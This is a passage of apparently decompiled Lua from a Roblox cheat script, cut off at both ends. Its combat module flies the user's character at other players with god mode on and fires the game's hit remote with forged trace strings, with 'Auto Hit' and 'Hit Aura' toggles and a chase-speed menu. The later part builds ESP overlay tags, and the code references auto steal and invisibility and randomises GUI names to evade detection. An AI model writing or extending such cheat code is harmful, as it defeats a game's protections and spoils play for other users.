if not arg4 then
position2 = combat.KeepOffWalls(arg2.Position, fn49(Vector3.new(n45.X, n45.Y, position.Z)))
end
return {
Goal = position2,
Velocity = Vector3.new(v17.X, 0, v17.Z),
Face = n40,
Current = n40,
Historical = n39,
Option = v19,
Distance = (position - arg2.Position).Magnitude,
}
end
combat.Steer = function(arg, arg2, arg3, arg4, arg5)
local n37 = math.max(arg5, 0.0041666666666666666)
local velocity = arg2.Velocity
local n38 = velocity + (arg2.Goal - arg.Position) / math.max(0.12, n37)
local n39 = math.min(arg3 + velocity.Magnitude, arg4)
if n39 < n38.Magnitude then
n38 = n38.Unit * n39
end
local position = arg.Position
local n40 = position + n38 * n37
local v15 = combat.KeepOffWalls(position, n40)
if (v15 - n40).Magnitude > 0.01 then
n38 = (v15 - position) / n37
end
local v16 = combat.KeepOffWalls(position, position)
if (v16 - position).Magnitude > 0.01 then
n38 = (v16 - position) / math.max(0.12, n37)
end
local assemblyLinearVelocity = n38 + Vector3.new(0, workspace.Gravity * n37 * 0.5, 0)
pcall(function()
local vector = Vector3.new(arg2.Face.X - position.X, 0, arg2.Face.Z - position.Z)
if vector.Magnitude > 0.05 then
arg.CFrame = CFrame.lookAt(position, position + vector.Unit)
end
arg.AssemblyLinearVelocity = assemblyLinearVelocity
arg.AssemblyAngularVelocity = Vector3.zero
end)
end
combat.TryHit = function(arg, arg2)
fn52()
if workspace:GetAttribute("PvPDisabled") == true then
return "Player hits are off right now"
end
local character = localPlayer.Character
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
local v15 = combat.Humanoid(character)
if not humanoidRootPart or not v15 or v15.Health <= 0 then
return "Waiting for your character"
end
local v16 = combat.PickBat(character)
if not v16 then
return "No bat found"
end
if not fn43(character, v15, v16) then
return "Equipping " .. tostring(v16:GetAttribute("GearName") or v16.Name)
end
if not combat.Hittable(arg) or combat.Ragdolled(arg) then
return nil
end
arg2 = arg2 or combat.Plan(arg, humanoidRootPart)
if not arg2 then
return nil
end
local n37 = combat.Range(v16) - n23
local n38 = humanoidRootPart.Position - humanoidRootPart.AssemblyLinearVelocity * n24
if (arg2.Historical - n38).Magnitude > n37 and (arg2.Current - n38).Magnitude > n37 then
return nil
end
local v17 = fn40()
if not v17 then
return nil
end
local n39 = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
local n40 = tonumber(v16:GetAttribute("CooldownEndTime")) or 0
if fn39() < n40 - n39 * 0.5 then
return nil
end
local lastFire = tbl35.LastFire
if os.clock() - lastFire < math.max(0.12, n39 * 1.5) then
return nil
end
tbl35.LastFire = os.clock()
tbl35.Trace = tbl35.Trace + 1
table.insert(tbl35.Pending, {
Target = arg,
Option = arg2.Option,
At = os.clock(),
Wait = math.max(0.5, n39 * 2 + 0.3),
RagdollBefore = fn41(arg),
CooldownBefore = n40,
Tool = v16,
})
local str4 = string.format("%d:%d:%d", localPlayer.UserId, tbl35.Trace, math.floor(fn39() * 1000))
pcall(function()
v17:FireServer(arg, str4)
end)
return "Hitting " .. arg.DisplayName
end
combat.ReadyBat = function()
local character = localPlayer.Character
local v15 = combat.Humanoid(character)
if not character or not v15 or v15.Health <= 0 then
return false
end
local v16 = combat.PickBat(character)
return v16 ~= nil and fn43(character, v15, v16)
end
combat.Swing = function()
if tbl4.Steal.Active or tbl4.Steal.Carrying then
return false
end
local lastFire = tbl35.LastFire
local flag4 = os.clock() - lastFire < 0.3
local flag5
if flag4 then
flag5 = flag4
else
flag5 = os.clock() - (tbl35.LastSwing or 0) < 0.15
end
if flag5 then
return false
end
local character = localPlayer.Character
local v15 = combat.Humanoid(character)
if not character or not v15 or v15.Health <= 0 then
return false
end
local v16 = combat.PickBat(character)
if not v16 or not fn43(character, v15, v16) then
return false
end
tbl35.LastSwing = os.clock()
pcall(function()
v16:Activate()
end)
return true
end
combat.HolderOf = function(arg)
local v15 = workspace:FindFirstChild(arg)
if not v15 then
return nil
end
for _, descendant in ipairs(v15:GetDescendants()) do
if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
local ok, result, result2 = pcall(function()
return descendant.Part0, descendant.Part1
end)
if ok then
for _, v16 in ipairs({ result, result2 }) do
if typeof(v16) == "Instance" and not v16:IsDescendantOf(v15) then
local model = v16:FindFirstAncestorOfClass("Model")
if model then
model = Players:GetPlayerFromCharacter(model) or Players:FindFirstChild(model.Name)
end
local v17 = model or nil
if v17 and v17 ~= localPlayer and v17:IsA("Player") then
return v17
end
end
end
end
end
end
return nil
end
task.spawn(function()
while not tbl4.CombatDisposed do
local holders = {}
if tbl4.CombatWantsHolders then
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
local ok, result = pcall(eggState.ReadFieldEggs)
local records = ok and type(result) == "table" and result.Records or nil
if type(records) == "table" then
for _, record in pairs(records) do
if type(record) == "table" and record.State == "Carried" and type(record.Uid) == "string" then
local v15 = combat.HolderOf(record.Uid)
if v15 then
holders[v15] = true
end
end
end
end
end
end
tbl35.Holders = holders
task.wait(0.3)
end
end)
combat.IsHolder = function(arg)
return tbl35.Holders[arg] == true
end
local tbl36 = {}
combat.OnNewLife = function(arg)
table.insert(tbl36, arg)
end
local function fn53()
table.clear(tbl35.Pending)
tbl35.LastFire = 0
tbl35.LastSwing = 0
tbl35.EquipAt = 0
table.clear(tbl35.Tracks)
table.clear(tbl35.WallSide)
tbl35.SpawnRagdoll = fn41(localPlayer)
for _, v15 in ipairs(tbl36) do
pcall(v15)
end
end
local characterAdded = localPlayer.CharacterAdded
local connect = characterAdded.Connect
local tbl37 = { localPlayer.CharacterRemoving:Connect(fn53), connect(characterAdded, fn53) }
fn4(function()
tbl4.CombatDisposed = true
for _, v15 in ipairs(tbl37) do
pcall(function()
v15:Disconnect()
end)
end
end)
end
do
local combat2 = tbl4.Combat
local tbl33 = { "Nearest", "Egg Holders", "Specific Player" }
local n20 = 0.7
local str4 = "No other players"
local tbl34 = {
Handles = {},
AuraHandle = nil,
Row = nil,
Picker = nil,
TargetMode = tbl33[1],
Picked = nil,
LabelToName = {},
Speed = 400,
MaxSpeed = 750,
Target = nil,
Plan = nil,
Moving = false,
Status = "Idle",
Shown = nil,
NamesDirty = true,
}
local function fn39()
for i, v14 in ipairs(tbl33) do
if tbl4.Toggle(tbl34.Handles[i], false) then
return v14
end
end
return nil
end
local function fn40()
return tbl4.Toggle(tbl34.AuraHandle, false) == true
end
tbl4.CombatActive = function()
return fn39() ~= nil or fn40()
end
local function fn41(arg)
if not combat2.Hittable(arg) then
return false
end
if tbl34.TargetMode == tbl33[2] then
return combat2.IsHolder(arg)
end
if tbl34.TargetMode == tbl33[3] then
return tbl34.Picked ~= nil and arg.Name == tbl34.Picked
end
return true
end
local function fn42(arg)
local target = tbl34.Target
local magnitude
if target and fn41(target) then
local v14, v15 = combat2.Parts(target)
magnitude = (v15.Position - arg).Magnitude
else
magnitude = math.huge
target = nil
end
local huge = math.huge
local v14 = nil
for _, player in ipairs(Players:GetPlayers()) do
if player ~= target and fn41(player) and not combat2.Ragdolled(player) then
local v15, v16 = combat2.Parts(player)
local magnitude2 = (v16.Position - arg).Magnitude
if magnitude2 < huge then
huge = magnitude2
v14 = player
end
end
end
if target then
if v14 and not combat2.Ragdolled(target) and huge < magnitude * n20 then
return v14
end
return target
end
return v14
end
local function fn43(arg, arg2)
local v14 = nil
for _, player in ipairs(Players:GetPlayers()) do
if player ~= localPlayer then
local character = player.Character
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
if humanoidRootPart then
local magnitude = (humanoidRootPart.Position - arg).Magnitude
if magnitude < arg2 and combat2.Hittable(player) and not combat2.Ragdolled(player) then
arg2 = magnitude
v14 = player
end
end
end
end
return v14, arg2
end
local function fn44()
tbl34.Plan = nil
if tbl34.Moving then
tbl34.Moving = false
tbl4.EndFlight()
tbl4.GodMode(false)
tbl4.Shield("combat", false)
combat2.ResetWalls()
end
tbl4.ReleaseMovement("combat")
end
combat2.OnNewLife(function()
tbl34.AuraVictim = nil
tbl34.Target = nil
tbl34.Plan = nil
pcall(fn44)
end)
local function fn45()
local movement = tbl4.Movement
return tbl4.Steal.Active or tbl4.Steal.Carrying or tbl4.Steal.Wanted and tbl4.Toggle(v5, false) or movement.Owner ~= nil and movement.Owner ~= "combat" and movement.Owner ~= "treadmill"
end
local function fn46(arg)
local character = localPlayer.Character
local n21 = combat2.Range(character and combat2.PickBat(character) or nil) + 6
local v14, v15 = fn43(arg.Position, n21 + 24)
if not v14 or v15 > n21 then
tbl34.AuraVictim = nil
if v14 then
combat2.ReadyBat()
end
tbl34.Status = "Aura ready, nobody in reach"
return
end
tbl34.AuraVictim = v14
tbl34.Status = combat2.TryHit(v14, combat2.Plan(v14, arg, nil, true)) or "Aura on " .. v14.DisplayName
end
local function fn47()
local v14 = fn39()
if v14 and v14 ~= tbl34.TargetMode then
tbl34.TargetMode = v14
tbl34.Target = nil
end
tbl4.CombatWantsHolders = v14 == tbl33[2]
local v15 = fn40()
local flag4 = not v14
if flag4 then
if tbl34.Target or tbl34.Moving then
tbl34.Target = nil
fn44()
end
end
if flag4 and not v15 then
tbl34.Status = "Idle"
return
end
local character = localPlayer.Character
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
local v16 = combat2.Humanoid(character)
if not humanoidRootPart or not v16 or v16.Health <= 0 then
tbl34.Target = nil
fn44()
tbl34.Status = "Waiting for your character"
return
end
if flag4 then
fn46(humanoidRootPart)
return
end
local v17 = fn42(humanoidRootPart.Position)
tbl34.Target = v17
if not v17 then
fn44()
if v15 then
fn46(humanoidRootPart)
return
end
tbl34.Status = v14 == tbl33[2] and "Waiting for someone to hold an egg" or v14 == tbl33[3] and "Picked player is not reachable" or "No player to hit"
return
end
local plan = combat2.Plan(v17, humanoidRootPart)
local flag5 = v14 ~= tbl33[2]
if not fn45() and (flag5 or not combat2.SelfRagdolled()) and tbl4.ClaimMovement("combat") and not tbl4.AntiGuard.Busy then
if not tbl34.Moving then
tbl34.Moving = true
tbl4.Shield("combat", true)
tbl4.GodMode(true)
tbl4.BeginFlight()
end
tbl4.GodTick()
tbl34.Plan = plan
else
if tbl34.Moving then
fn44()
end
tbl34.Plan = nil
end
local v18 = combat2.TryHit(v17, plan, flag5)
plan = plan and math.floor(plan.Distance + 0.5) or 0
if v18 then
tbl34.Status = v18 .. string.format("  %d studs", plan)
elseif fn45() then
tbl34.Status = string.format("Waiting for Auto Steal, near %s", v17.DisplayName)
else
tbl34.Status = string.format("Chasing %s  %d studs", v17.DisplayName, plan)
end
end
local function fn48()
local tbl35 = {}
for _, player in ipairs(Players:GetPlayers()) do
if player ~= localPlayer then
table.insert(tbl35, player)
end
end
table.sort(tbl35, function(arg, arg2)
return string.lower(arg.DisplayName) < string.lower(arg2.DisplayName)
end)
local tbl36 = {}
for _, v14 in ipairs(tbl35) do
tbl36[v14.DisplayName] = (tbl36[v14.DisplayName] or 0) + 1
end
local tbl37 = {}
local tbl38 = {}
for _, v14 in ipairs(tbl35) do
local displayName = v14.DisplayName
if tbl36[displayName] > 1 then
displayName = string.format("%s (@%s)", v14.DisplayName, v14.Name)
end
table.insert(tbl37, displayName)
tbl38[displayName] = v14.Name
end
if #tbl37 == 0 then
tbl37[1] = str4
end
return tbl37, tbl38
end
local function fn49(arg)
for k, v14 in pairs(tbl34.LabelToName) do
if v14 == arg then
return k
end
end
return nil
end
local connection2 = RunService.PreSimulation:Connect(function(deltaTime)
local plan = tbl34.Plan
if not plan or not tbl34.Moving then
return
end
local v14 = tbl4.Root()
if v14 then
combat2.Steer(v14, plan, tbl34.Speed, math.max(tbl34.Speed, tbl34.MaxSpeed), deltaTime)
end
end)
local n21 = 0.05
local n22 = 0
local connection3 = RunService.Heartbeat:Connect(function()
local flag4 = fn39() ~= nil
local v14 = fn40()
if not v14 then
tbl34.AuraVictim = nil
end
local now = os.clock()
if flag4 or not v14 or now >= n22 then
if v14 and not flag4 then
n22 = now + n21
end
if not pcall(fn47) then
tbl34.Status = "Retrying"
end
end
if flag4 or v14 and tbl34.AuraVictim ~= nil then
pcall(combat2.Swing)
end
local row = tbl34.Row
if row and tbl34.Shown ~= tbl34.Status and type(row.Set) == "function" then
tbl34.Shown = tbl34.Status
pcall(row.Set, row, tbl34.Status)
end
local picker = tbl34.Picker
if tbl34.NamesDirty and picker and type(picker.SetOptions) == "function" then
tbl34.NamesDirty = false
local v15, v16 = fn48()
tbl34.LabelToName = v16
pcall(picker.SetOptions, picker, v15, tbl34.Picked and fn49(tbl34.Picked) or v15[1], false)
end
end)
local connection4 = Players.PlayerAdded:Connect(function()
tbl34.NamesDirty = true
end)
local connection5 = Players.PlayerRemoving:Connect(function(player)
tbl34.NamesDirty = true
if tbl34.Target == player then
tbl34.Target = nil
end
end)
fn4(function()
for _, v14 in ipairs({ connection2, connection3, connection4, connection5 }) do
pcall(function()
v14:Disconnect()
end)
end
tbl34.Target = nil
fn44()
end)
local function fn50(arg, arg2)
if tbl4.Toggle(arg, false) and tbl4.Toggle(tbl4.InvisibilityHandle, false) then
tbl4.UiDefer(function()
pcall(arg.Set, arg, false, false)
tbl4.Notify(arg2, "Turn off Invisibility first, both cannot be on at the same time")
end)
return true
end
return false
end
tbl34.Row = v13:CreateText({ Name = "Hit Status", Text = "Idle" })
local v14 = v2:CreateExclusiveGroup({ Name = "Chilli Combat Targets", MaxActive = 1 })
for i, v15 in ipairs({ "Auto Hit Nearest Player", "Auto Hit Egg Holders", "Auto Hit Specific Player" }) do
local v16 = nil
v16 = v13:CreateToggle({
Name = v15,
Default = false,
Callback = function()
fn50(v16, v15)
end,
})
pcall(v16.JoinExclusiveGroup, v16, v14)
tbl34.Handles[i] = v16
end
local v15, v16 = fn48()
tbl34.LabelToName = v16
tbl34.Picker = v13:CreateDropdown({
Name = "Hit Player",
Options = v15,
Default = v15[1],
SubOf = tbl34.Handles[3],
Callback = function(arg)
tbl34.Picked = tbl34.LabelToName[tostring(arg)]
tbl34.Target = nil
end,
})
tbl34.AuraHandle = v13:CreateToggle({
Name = "Hit Aura",
Default = false,
Callback = function()
fn50(tbl34.AuraHandle, "Hit Aura")
end,
})
pcall(tbl34.AuraHandle.JoinExclusiveGroup, tbl34.AuraHandle, v14)
v13:CreateLabel({ Name = "Chase Settings", Text = "Chase Settings" })
v13:CreateSlider({
Name = "Hit Tween Speed",
Min = 100,
Max = 1000,
Default = 400,
Increment = 10,
Unit = "studs/s",
Callback = function(arg)
tbl34.Speed = math.clamp(tonumber(arg) or 400, 100, 1000)
end,
})
v13:CreateSlider({
Name = "Hit Max Speed",
Min = 100,
Max = 1000,
Default = 750,
Increment = 10,
Unit = "studs/s",
Callback = function(arg)
tbl34.MaxSpeed = math.clamp(tonumber(arg) or 750, 100, 1000)
end,
})
v13:CreateSlider({
Name = "Hit Lead",
Note = "Stand further ahead of the target (+) or closer to them (-)",
Min = -400,
Max = 100,
Default = -275,
Increment = 1,
Callback = function(arg)
combat2.SetLead(arg)
end,
})
v13:CreateSlider({
Name = "Hit Sweep",
Note = "How far you move back and forth in front of the target",
Min = 0,
Max = 250,
Default = 60,
Increment = 1,
Unit = "%",
Callback = function(arg)
combat2.SetSweep(arg)
end,
})
local n23 = 2
local v18 = nil
local function fn51()
local getState = v2.GetState
return v2:GetState("Quick Pinned Features"), getState(v2, "Quick Pin Groups")
end
local function fn52()
local tbl35 = {}
for _, v19 in ipairs({ tbl34.Handles[1], tbl34.Handles[2], tbl34.AuraHandle }) do
local ok, result = pcall(function()
return v19:GetQuickPath()
end)
if ok and type(result) == "string" then
table.insert(tbl35, result)
end
end
return tbl35
end
local function fn53()
local v19, v20 = fn51()
if not v19 or not v20 then
return false
end
local v21 = v19:Get()
local v22 = v20:Get()
if type(v21) ~= "table" or type(v22) ~= "table" then
return false
end
local v23 = fn52()
if #v23 == 0 then
return false
end
for _, v24 in ipairs(v23) do
if not table.find(v21, v24) or tonumber(v22[v24]) ~= n23 then
return false
end
end
return true
end
local function fn54()
if v18 and type(v18.SetActionText) == "function" then
pcall(v18.SetActionText, v18, fn53() and "Remove" or "Add")
end
end
local function fn55()
local v19, v20 = fn51()
if not v19 or not v20 then
tbl4.Notify("Quick Bar", "The Quick Bar is not ready yet, try again in a moment")
return
end
local v21 = fn53()
local tbl35 = {}
local tbl36 = {}
local v22 = v19:Get()
if type(v22) == "table" then
for i, v23 in ipairs(v22) do
tbl35[i] = v23
end
end
local v23 = v20:Get()
if type(v23) == "table" then
for k, v24 in pairs(v23) do
tbl36[k] = v24
end
end
for _, v24 in ipairs(fn52()) do
local v25 = table.find(tbl35, v24)
if v21 then
if v25 then
table.remove(tbl35, v25)
end
tbl36[v24] = nil
else
tbl36[v24] = n23
if not v25 then
table.insert(tbl35, v24)
end
end
end
v20:Set(tbl36)
v19:Set(tbl35)
fn54()
tbl4.Notify("Quick Bar", v21 and "Removed the hit toggles from Quick Bar 2" or "Added the hit toggles to Quick Bar 2")
end
v18 = v13:CreateButton({
Name = "Add/Remove Hits On Quick Bar 2",
Note = "Pin or unpin the hit toggles on Quick Bar 2",
ButtonText = "Add",
ConfirmText = "Done!",
Callback = function()
tbl4.UiDefer(fn55)
end,
})
task.delay(3, function()
tbl4.UiDefer(fn54)
end)
end
espSection = tbl4.EspSection
local function fn39(arg, arg2)
local ok, result = pcall(Font.new, arg, arg2, Enum.FontStyle.Normal)
return ok and result or nil
end
tbl6 = {
MainFont = fn39("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
StatusFont = fn39("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular),
Sequence = function(arg)
local v14 = table.create(#arg)
for i, v15 in ipairs(arg) do
v14[i] = ColorSequenceKeypoint.new(v15[1], v15[2])
end
return ColorSequence.new(v14)
end,
}
local color
color = Color3.fromRGB
local sequence2
sequence2 = tbl6.Sequence
local palettes
palettes = {}
do
local gold = {}
local tbl33 = {}
local tbl34 = { 0, color(255, 231, 158) }
local tbl35 = { 0.4, color(255, 196, 66) }
local tbl36 = { 1, color(214, 142, 12) }
tbl33[1] = tbl34
tbl33[2] = tbl35
tbl33[3] = tbl36
gold.Text = sequence2(tbl33)
local tbl37 = {}
local tbl38 = { 0, color(122, 76, 0) }
local tbl39 = { 0.55, color(62, 38, 0) }
local tbl40 = { 1, color(20, 12, 0) }
tbl37[1] = tbl38
tbl37[2] = tbl39
tbl37[3] = tbl40
gold.Stroke = sequence2(tbl37)
gold.Outline = color(255, 232, 152)
palettes.Gold = gold
end
do
local orange = {}
local tbl33 = {}
local tbl34 = { 0, color(255, 198, 132) }
local tbl35 = { 0.4, color(255, 146, 40) }
local tbl36 = { 1, color(206, 92, 0) }
tbl33[1] = tbl34
tbl33[2] = tbl35
tbl33[3] = tbl36
orange.Text = sequence2(tbl33)
local tbl37 = {}
local tbl38 = { 0, color(112, 54, 0) }
local tbl39 = { 0.55, color(56, 27, 0) }
local tbl40 = { 1, color(18, 8, 0) }
tbl37[1] = tbl38
tbl37[2] = tbl39
tbl37[3] = tbl40
orange.Stroke = sequence2(tbl37)
orange.Outline = color(255, 194, 112)
palettes.Orange = orange
end
do
local red = {}
local tbl33 = {}
local tbl34 = { 0, color(255, 105, 105) }
local tbl35 = { 0.4, color(255, 28, 40) }
local tbl36 = { 1, color(184, 0, 18) }
tbl33[1] = tbl34
tbl33[2] = tbl35
tbl33[3] = tbl36
red.Text = sequence2(tbl33)
local tbl37 = {}
local tbl38 = { 0, color(124, 0, 15) }
local tbl39 = { 0.55, color(61, 0, 9) }
local tbl40 = { 1, color(18, 0, 3) }
tbl37[1] = tbl38
tbl37[2] = tbl39
tbl37[3] = tbl40
red.Stroke = sequence2(tbl37)
red.Outline = color(255, 128, 138)
palettes.Red = red
end
do
local accent = {}
local tbl33 = {}
local tbl34 = { 0, color(170, 255, 160) }
local tbl35 = { 0.45, color(58, 255, 55) }
local tbl36 = { 1, color(20, 109, 0) }
tbl33[1] = tbl34
tbl33[2] = tbl35
tbl33[3] = tbl36
accent.Text = sequence2(tbl33)
local tbl37 = {}
local tbl38 = { 0, color(10, 52, 6) }
local tbl39 = { 1, color(3, 16, 0) }
tbl37[1] = tbl38
tbl37[2] = tbl39
accent.Stroke = sequence2(tbl37)
accent.Outline = color(58, 255, 55)
palettes.Accent = accent
end
do
local sheen = {}
local tbl33 = {}
local tbl34 = { 0, color(255, 255, 255) }
local tbl35 = { 0.5, color(222, 222, 222) }
local tbl36 = { 1, color(255, 255, 255) }
tbl33[1] = tbl34
tbl33[2] = tbl35
tbl33[3] = tbl36
sheen.Text = sequence2(tbl33)
local tbl37 = {}
local tbl38 = { 0, color(8, 8, 8) }
local tbl39 = { 1, color(8, 8, 8) }
tbl37[1] = tbl38
tbl37[2] = tbl39
sheen.Stroke = sequence2(tbl37)
sheen.Outline = color(255, 255, 255)
palettes.Sheen = sheen
end
tbl6.Palettes = palettes
tbl6.PaletteFromColor = function(arg)
local color2 = Color3.new(1, 1, 1)
local color3 = Color3.new(0, 0, 0)
local tbl33 = {}
local sequence3 = tbl6.Sequence
local tbl34 = {}
local tbl35 = { 0, arg:Lerp(color2, 0.5) }
local tbl36 = { 0.4, arg:Lerp(color2, 0.1) }
local tbl37 = { 1, arg:Lerp(color3, 0.25) }
tbl34[1] = tbl35
tbl34[2] = tbl36
tbl34[3] = tbl37
tbl33.Text = sequence3(tbl34)
local sequence4 = tbl6.Sequence
local tbl38 = {}
local tbl39 = { 0, arg:Lerp(color3, 0.55) }
local tbl40 = { 0.55, arg:Lerp(color3, 0.75) }
local tbl41 = { 1, arg:Lerp(color3, 0.92) }
tbl38[1] = tbl39
tbl38[2] = tbl40
tbl38[3] = tbl41
tbl33.Stroke = sequence4(tbl38)
tbl33.Outline = arg:Lerp(color2, 0.25)
return tbl33
end
tbl6.SizeScale = 1
local tbl33 = {}
tbl6.OnSizeChanged = function(arg)
table.insert(tbl33, arg)
end
tbl6.SetSizeScale = function(sizeScale)
if tbl6.SizeScale == sizeScale then
return
end
tbl6.SizeScale = sizeScale
for _, v14 in ipairs(tbl33) do
pcall(v14)
end
end
tbl6.RowHeight = function(arg)
local currentCamera = workspace.CurrentCamera
return math.max(6, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.014, 13, 19) * (arg or tbl6.SizeScale)))
end
tbl6.ScaledWidth = function(arg, arg2)
return math.max(30, math.floor(arg * (arg2 or tbl6.SizeScale)))
end
tbl6.CreateRuntime = function()
local screenGui = Instance.new("ScreenGui")
screenGui.Name = fn3()
screenGui.Archivable = false
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 48
screenGui.Parent = v3
return screenGui
end
tbl6.CreateTag = function(parent, maxDistance)
local billboardGui = Instance.new("BillboardGui")
billboardGui.Name = fn3()
billboardGui.AlwaysOnTop = true
billboardGui.LightInfluence = 0
billboardGui.MaxDistance = maxDistance
local frame = Instance.new("Frame")
frame.Name = fn3()
frame.BackgroundTransparency = 1
frame.BorderSizePixel = 0
frame.Size = UDim2.fromScale(1, 1)
frame.Parent = billboardGui
local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Name = fn3()
uiListLayout.FillDirection = Enum.FillDirection.Vertical
uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
uiListLayout.Parent = frame
billboardGui.Parent = parent
return billboardGui, frame
end
tbl6.CreateTextRow = function(parent, fontFace, layoutOrder, arg)
local frame = Instance.new("Frame")
frame.Name = fn3()
frame.BackgroundTransparency = 1
frame.BorderSizePixel = 0
frame.Size = UDim2.fromScale(1, arg)
frame.LayoutOrder = layoutOrder
frame.Parent = parent
local function createTextLabel(zIndex)
local textLabel = Instance.new("TextLabel")
textLabel.Name = fn3()
textLabel.BackgroundTransparency = 1
textLabel.Size = UDim2.fromScale(1, 1)
textLabel.Text = ""
textLabel.TextScaled = true
textLabel.TextStrokeTransparency = 1
textLabel.TextXAlignment = Enum.TextXAlignment.Center
textLabel.TextYAlignment = Enum.TextYAlignment.Center
textLabel.ZIndex = zIndex
if fontFace then
textLabel.FontFace = fontFace
else
textLabel.Font = Enum.Font.GothamBold
end
textLabel.Parent = frame
return textLabel
end
local v14 = createTextLabel(2)
v14.Position = UDim2.fromOffset(1, 1)
v14.TextColor3 = Color3.new(0, 0, 0)
v14.TextTransparency = 0.1
local v15 = createTextLabel(3)
v15.TextColor3 = Color3.new(1, 1, 1)
local uiStroke = Instance.new("UIStroke")
uiStroke.Name = fn3()
uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
uiStroke.LineJoinMode = Enum.LineJoinMode.Round
uiStroke.Color = Color3.new(1, 1, 1)
uiStroke.Transparency = 0.05
uiStroke.Thickness = pcall(function()
uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
end) and 0.05 or 1.2
uiStroke.Parent = v15
local uiGradient = Instance.new("UIGradient")
uiGradient.Name = fn3()
uiGradient.Rotation = 90
uiGradient.Parent = uiStroke
local uiGradient2 = Instance.new("UIGradient")
uiGradient2.Name = fn3()
uiGradient2.Rotation = 90
uiGradient2.Parent = v15
return { Holder = frame, Shadow = v14, Label = v15, StrokeGradient = uiGradient, TextGradient = uiGradient2, Palette = nil }
end
tbl6.SetRow = function(arg, text, palette)
if arg.Label.Text ~= text then
arg.Label.Text = text
arg.Shadow.Text = text
end
if arg.Palette ~= palette then
arg.Palette = palette
arg.TextGradient.Color = palette.Text
arg.TextGradient.Rotation = palette.Rotation or 90
arg.StrokeGradient.Color = palette.Stroke
end
end
tbl6.ReadToggle = function(arg, arg2)
if type(arg) ~= "table" then
return arg2 == true
end
local ok, result = pcall(function()
local controller = arg._controller
return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
end)
if ok and type(result) == "boolean" then
return result
end
for _, v14 in ipairs({ "Get", "GetValue" }) do
local ok2, result2 = pcall(function()
return arg[v14]
end)
if ok2 and type(result2) == "function" then
local ok3, result3 = pcall(result2, arg)
if ok3 and type(result3) == "boolean" then
return result3
end
end
end
return arg2 == true
end
tbl6.SyncSoon = function(arg)
arg()
task.delay(0.35, arg)
end
tbl6.GetGuardAreas = function()
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
world = world and world:FindFirstChild("Areas")
return world and world:FindFirstChild("GuardAreas")
end
tbl6.FindGuardRoot = function(arg)
local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
if humanoidRootPart and humanoidRootPart:IsA("BasePart") then
return humanoidRootPart
end
if arg.PrimaryPart then
return arg.PrimaryPart
end
return arg:FindFirstChildWhichIsA("BasePart", true)
end
tbl6.WatchGuards = function(arg)
local tbl34 = {}
local v14 = tbl6.GetGuardAreas()
if not v14 then
return tbl34
end
local function fn40(child)
local guard = child:FindFirstChild("Guard")
if guard and guard:IsA("Model") then
arg(child.Name, guard)
end
table.insert(tbl34, child.ChildAdded:Connect(function(child2)
if child2.Name == "Guard" and child2:IsA("Model") then
arg(child.Name, child2)
end
end))
end
for _, child in ipairs(v14:GetChildren()) do
fn40(child)
end
table.insert(tbl34, v14.ChildAdded:Connect(fn40))
return tbl34
end
tbl6.DisconnectAll = function(arg)
for _, v14 in ipairs(arg) do
pcall(function()
v14:Disconnect()
end)
end
table.clear(arg)
end
n = 18
tbl7 = {
"Icon",
"Name",
"Rarity",
"Mutation",
"Value",
"Weight",
"Size",
"Sell Price",
"Distance",
"Area",
"State",
}
tbl8 = { "Icon", "Name", "Value" }
tbl9 = { "Off", "Rare Only", "All Shown" }
tbl10 = { Icon = 3.2, Name = 1.35, Rarity = 1.2, Mutation = 1, Value = 1.1, Info = 1 }
local function fn40()
local ok, result = pcall(Font.new, "rbxassetid://12187365977", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
return ok and result or tbl6.StatusFont
end
v6 = fn40()
sequence = tbl6.Sequence
tbl11 = {}
do
local tbl34 = { 0, Color3.fromRGB(255, 255, 255) }
local tbl35 = { 0.2, Color3.fromRGB(206, 212, 224) }
local tbl36 = { 0.42, Color3.fromRGB(74, 80, 94) }
local tbl37 = { 0.58, Color3.fromRGB(42, 46, 56) }
local tbl38 = { 0.78, Color3.fromRGB(158, 166, 182) }
local tbl39 = { 1, Color3.fromRGB(250, 252, 255) }
tbl11[1] = tbl34
tbl11[2] = tbl35
tbl11[3] = tbl36
tbl11[4] = tbl37
tbl11[5] = tbl38
tbl11[6] = tbl39
end
end
local v7, v8, v9, tbl12, paint, bold, color, n2, v10, tbl13
local tbl14, tbl15, tbl16, flag, n3, fn8, fn9, fn10, fn11, fn12
local fn13, fn14
do
local n4, n5, n6, n7, n8, n9, n10, n11, n12, tweenInfo
local tweenInfo2, tweenInfo3, tweenInfo4, tweenInfo5, TweenService, color2, fn15, tbl17, tbl18
do
local v11
v11 = sequence(tbl11)
local v12
v12 = tbl6.PaletteFromColor(Color3.fromRGB(77, 255, 122))
local tbl19
tbl19 = {}
do
local sequence2 = tbl6.Sequence
local tbl20 = {}
local tbl21 = { 0, Color3.fromRGB(255, 255, 255) }
local tbl22 = { 0.5, Color3.fromRGB(222, 238, 255) }
local tbl23 = { 1, Color3.fromRGB(255, 255, 255) }
tbl20[1] = tbl21
tbl20[2] = tbl22
tbl20[3] = tbl23
tbl19.Text = sequence2(tbl20)
end
do
local sequence2 = tbl6.Sequence
local tbl20 = {}
local tbl21 = { 0, Color3.fromRGB(8, 8, 8) }
local tbl22 = { 1, Color3.fromRGB(8, 8, 8) }
tbl20[1] = tbl21
tbl20[2] = tbl22
